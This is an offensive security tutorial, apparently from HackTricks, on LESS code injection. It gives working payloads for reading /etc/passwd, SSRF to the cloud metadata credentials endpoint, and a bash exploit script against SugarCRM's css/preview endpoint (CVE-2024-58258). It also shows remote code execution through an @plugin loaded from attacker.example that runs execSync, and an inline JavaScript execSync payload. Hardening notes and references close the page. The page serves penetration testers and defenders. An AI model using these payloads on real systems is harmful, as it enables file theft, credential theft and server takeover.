# LESS Code Injection: Local File Read, SSRF & RCE

{{#include ../../../banners/hacktricks-training.md}}

LESS is a CSS preprocessor with variables, mixins, functions, and `@import`. With the `(inline)` import option, the compiler copies the imported resource into CSS output without processing it as LESS. Server-side fetching, accepted URL schemes, and local-file access depend on the compiler implementation and options.<sup>[[4]](#references)</sup>

When an application concatenates **user-controlled input** into a string that is later parsed by the LESS compiler, an attacker can **inject arbitrary LESS code**.  By abusing `@import (inline)` the attacker can force the server to retrieve:

* Local files through absolute paths, traversal, or `file://` when the compiler accepts that scheme (information disclosure / Local File Inclusion).
* Remote resources on internal networks or cloud metadata services (SSRF).

This technique affected the SugarCRM `/rest/v10/css/preview` endpoint in the version ranges documented by SA-2024-059; do not reduce the advisory's edition-specific ranges to a universal “≤ 14.0.0” claim.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

### Exploitation

1. Identify a parameter that is directly embedded inside a stylesheet string processed by the LESS engine (e.g. `?param=` in SugarCRM).<sup>[[1]](#references)</sup>
2. Close the current statement and inject new directives.  The most common primitives are:
   * `;`  – terminates the previous declaration.
   * `}`  – closes the previous block (if required).
3. Use `@import (inline) '<URL>';` to read arbitrary resources.
4. Optionally bracket the import with **markers** (`data:` URIs) to extract the fetched content from the compiled CSS.

#### Local File Read

```less
1; @import (inline) 'data:text/plain,@@START@@';
@import (inline) '/etc/passwd';
@import (inline) 'data:text/plain,@@END@@'; //
```

The contents of `/etc/passwd` will appear between the markers. Try absolute paths, traversal from the compiler's working directory, and `file://` URLs separately: supported path syntax differs among Less.js, less.php, and application-specific file managers.<sup>[[4]](#references)[[6]](#references)</sup>

#### Traversal and parser-error disclosure

On Node.js Less, `(inline)` accepts normal absolute or relative filesystem paths, so `file://` is not required. If `inline` is filtered, a plain import still makes the compiler parse the target as Less. When parsing fails, a verbose application error can disclose the offending line and adjacent lines through fields such as `extract`.<sup>[[5]](#references)[[6]](#references)</sup>

```less
@import (inline) "../../../../../../etc/passwd";
@import "../../../../../../etc/sysctl.conf"; // inspect the full parse error
```

#### SSRF – Cloud Metadata

```
1; @import (inline) "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
@import (inline) 'data:text/plain,@@END@@'; //
```

#### Automated PoC (SugarCRM example)

```bash
#!/usr/bin/env bash
# Usage: ./exploit.sh http://target/sugarcrm/ /etc/passwd

TARGET="$1"        # Base URL of SugarCRM instance
RESOURCE="$2"      # Local path or URL to fetch

LESS="1; @import (inline) 'data:text/plain,@@START@@'; @import (inline) '$RESOURCE'; @import (inline) 'data:text/plain,@@END@@';//"
INJ=$(python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=""))' "$LESS")

curl -sk "${TARGET}rest/v10/css/preview?baseUrl=1&param=${INJ}" | \
  sed -n '/@@START@@/,/@@END@@/p' | sed '1d;$d'
```

### Escalation to Code Execution (Less.js)

#### `@plugin` RCE

Less.js plugins are JavaScript, and the Node.js plugin loader evaluates their source with a CommonJS-style `require`. If `@plugin` rules are enabled and the file manager can reach an attacker-controlled URL or writable local path, LESS injection becomes server-side JavaScript execution—not just SSRF. The remote file must export a valid plugin object; its top-level code and `install()` run during compilation.<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```less
@plugin "https://attacker.example/less-plugin.js";
```

```javascript
module.exports = {
  install() {
    require("child_process").execSync("id > /tmp/less-rce");
  }
};
```

A safe probe during an authorized test is to make the plugin perform an out-of-band DNS/HTTP callback rather than run a destructive command. Test local and HTTP(S) plugin locations separately because the configured file managers decide which schemes are supported.<sup>[[5]](#references)[[6]](#references)</sup>

#### Legacy inline JavaScript

Backtick JavaScript is another RCE primitive when the application uses Less before 3.0.0 or explicitly passes `{ javascriptEnabled: true }` (equivalent to `lessc --js`). It is disabled by default in modern Less.js, but wrappers may turn it back on. On recent Node.js versions, a direct execution probe is:<sup>[[6]](#references)</sup>

```less
@out: `global.process.getBuiltinModule("child_process").execSync("id").toString()`;
.probe { result: "@{out}"; }
```

Treat failure of this payload only as evidence that **inline JavaScript** is disabled; it does not rule out `@plugin` execution or dangerous imports.

### Testing and Hardening Notes

- Start with an attacker callback URL to determine whether the import is resolved **server-side**. Then test loopback/private addresses and harmless readable files; only use cloud metadata endpoints when the target and authorization explicitly permit it.<sup>[[6]](#references)</sup>
- Error responses matter: record status, body, timing, and structured error fields. A blocked inline response may still be exploitable as blind SSRF, and a rejected plain import may leak file content in parser diagnostics.<sup>[[5]](#references)</sup>
- For untrusted Less.js input, keep `javascriptEnabled: false` and set `disablePluginRule: true` (`lessc --disable-plugin-rule`). Independently deny imports or constrain them to canonicalized allow-listed files; disabling plugins does **not** disable `@import`.<sup>[[5]](#references)[[6]](#references)</sup>
- If imports are required, enforce the policy in a custom file manager after resolving traversal/symlinks and every redirect. Deny URL schemes and private/link-local destinations unless explicitly needed. Run the compiler in a sandbox with no secrets, minimal filesystem access, no outbound network, and strict time/output limits.<sup>[[6]](#references)</sup>

### Real-World Cases

| Product | Vulnerable Endpoint | Impact |
|---------|--------------------|--------|
| SugarCRM (affected ranges in SA-2024-059) | `/rest/v10/css/preview?param=` | Unauthenticated SSRF and local file read |



## References

- [1] [SugarCRM ≤ 14.0.0 (css/preview) LESS Code Injection Vulnerability](https://karmainsecurity.com/KIS-2025-04)
- [2] [SugarCRM Security Advisory SA-2024-059](https://support.sugarcrm.com/resources/security/sugarcrm-sa-2024-059/)
- [3] [CVE-2024-58258](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-58258)
- [4] [Less documentation — Import At-Rules](https://lesscss.org/features/#import-atrules-feature)
- [5] [Less.js issue #3561 — Prevent use of plugin and imports from untrusted sources](https://github.com/less/less.js/issues/3561)
- [6] [Exploiting Less.js for RCE, SSRF & File Disclosure](https://www.softwaresecured.com/post/exploiting-less-js-to-achieve-remote-code-execution-rce)
{{#include ../../../banners/hacktricks-training.md}}
